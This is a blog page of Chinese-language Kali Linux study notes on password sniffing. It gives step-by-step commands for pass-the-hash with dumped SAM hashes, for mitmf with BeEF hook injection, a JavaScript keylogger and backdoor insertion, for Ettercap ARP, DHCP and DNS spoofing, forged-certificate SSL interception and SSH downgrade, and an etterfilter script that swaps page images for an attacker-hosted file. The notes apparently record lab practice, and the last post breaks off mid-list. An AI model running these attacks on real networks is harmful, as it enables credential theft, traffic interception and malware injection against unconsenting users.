<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;10&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/10/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/" itemprop="url">Kali Linux笔记(六十四)：密码嗅探--传递Hash值</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  161 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Pass-the-Hash（PTH）"><a href="#1-Pass-the-Hash（PTH）" class="headerlink" title="1. Pass the Hash（PTH）"></a>1. Pass the Hash（PTH）</h4><ul>
<li>密码破解耗费时间资源巨大 </li>
<li>使用密文提交给服务器直接完成身份认证 </li>
<li>NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）</li>
<li>企业中使用ghost等工具克隆安装系统</li>
<li>操作<ul>
<li>Win7插入一个Kali光盘，用光盘启动</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong></li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong></li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM</code></strong></li>
<li>使用nc传递HASH值</li>
<li>Win7光盘释放重启，关闭Win7防火墙</li>
<li><strong><code>🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd</code></strong></li>
</ul>
</li>
<li>▲ 只适用于Window系统</li>
<li>▲ 2020.1.27 CreateService failed. NT_STATUS_ACCESS_DENIED</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(六十三)：密码嗅探--中间人攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/" itemprop="url">Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  808 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-密码嗅探"><a href="#1-密码嗅探" class="headerlink" title="1. 密码嗅探"></a>1. 密码嗅探</h4><ul>
<li>二、三层地址<ul>
<li>IP网络到网络</li>
<li>MAC主机到主机（硬件固化地址，广播寻址）</li>
<li>▲ 路由器不转发广播</li>
<li>▲ 局域网内MAC寻址，广域网IP寻址</li>
</ul>
</li>
<li>交换机与HUB<ul>
<li>▲ HUB是物理层的设备，非二层设备，不识别MAC地址</li>
<li>HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全）</li>
<li>交换机根据学习地址转发，形成APR地址列表</li>
<li>混杂模式抓包</li>
</ul>
</li>
<li>ARP协议（IP地址解析程MAC地址）<ul>
<li>免费ARP</li>
<li>基于广播学习</li>
<li>以太网头、ARP头</li>
<li>▲ 请求、响应相对独立（不请求也可以响应，可以人为构造响应包）</li>
<li>▲ 基于传闻的协议（无条件接受响应包，ARP地址欺骗根源）</li>
</ul>
</li>
</ul>
<h4 id="2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><a href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）" class="headerlink" title="2. ARP地址欺骗（Win 7 → Kali，单向欺骗）"></a>2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</h4><ul>
<li><strong><code>🔺命令：ping 网关</code></strong>（查看网络连通性）</li>
<li><strong><code>🔺命令：arp -a</code></strong>（查看网关地址）</li>
<li>使用OmniPeek构造ARP数据包，先抓取ARP的数据包</li>
<li><strong><code>🔺命令：arp -d</code></strong>（清除ARP缓存）</li>
<li><strong><code>🔺命令：ping 网关</code></strong>（重新发arp包）</li>
<li>选取ARP Response的数据包，Send → Edit Send Packet</li>
<li><strong><code>🔺命令：ping Kali的IP地址/arp -a</code></strong>（查看Kali的MAC地址）</li>
<li>Ethernet → 修改目的地的MAC地址为Kali的MAC地址</li>
<li>Ethernet → 修改源地址的MAC地址为Win7的MAC地址</li>
<li>ARP → Target Hardware Addr → Kali的MAC地址</li>
<li>ARP → Target Internet Addr → Kali的IP地址</li>
<li>Send → Send Window → Transmit One（可能需要持续发包）</li>
<li>Kali查看arp → <strong><code>🔺命令：arp -an</code></strong></li>
<li>Win7/kali抓包都可以看到ARP地址欺骗效果（发送ping数据包）</li>
<li>▲ 2020.1.27 Omnipeek need a Universal C Runtime</li>
</ul>
<h4 id="3-ARP地址欺骗（Kali-→-Win7）"><a href="#3-ARP地址欺骗（Kali-→-Win7）" class="headerlink" title="3. ARP地址欺骗（Kali → Win7）"></a>3. ARP地址欺骗（Kali → Win7）</h4><ul>
<li>手动修改数据包实现ARP欺骗</li>
<li>arpspoof（双向欺骗+路由转发）<ul>
<li><strong><code>🔺命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></strong> </li>
<li><strong><code>🔺命令：arpspoof -t（目标） 1.1.1.12 -r（路由器） 1.1.1.1</code></strong>（发送的是arp的Rely）</li>
</ul>
</li>
<li>网络嗅探<ul>
<li>driftnet（传输图片的还原）<ul>
<li>-i（选择端口）</li>
<li>-a（存放保存）</li>
<li>-d（存放的路径）</li>
<li>-s（声音文件的保存）</li>
</ul>
</li>
<li><strong><code>🔺命令：driftnet -i eth0 -a -d /root/Desktop/tem -s</code></strong></li>
<li><strong><code>🔺命令：webspy -i eth0 1.1.1.1</code></strong>（抓取网络url地址）▲ 2020.1.27只能一个一个进行截取</li>
<li><strong><code>🔺命令：urlsnarf -i eth0</code></strong>（访问端口截断解析）</li>
<li><strong><code>🔺命令：dsniff -i eth0 -m</code></strong>（密码嗅探截获）<ul>
<li>/usr/share/dsniff/dsniff.services（支持协议解码类型）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnsspoof -i eth0 -f /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</code></strong>（DNS欺骗）<ul>
